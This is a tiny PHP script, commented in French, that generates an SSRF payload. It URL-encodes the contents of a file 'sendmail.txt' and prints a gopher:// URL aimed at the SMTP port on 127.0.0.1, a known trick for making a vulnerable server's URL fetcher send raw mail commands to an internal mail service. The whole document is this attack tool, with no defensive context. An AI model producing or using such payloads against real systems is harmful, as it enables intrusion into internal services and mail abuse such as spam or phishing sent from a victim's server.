<?php

$string = rawurlencode(file_get_contents('sendmail.txt'));
$host = '127.0.0.1';
$port = 25;
$letter = chr(rand(97,122)); // Cette lettre est ignorée par le protocole, on en prend une aléatoire

echo 'gopher://' . $host . ':' . $port . '/' . $letter . $string;
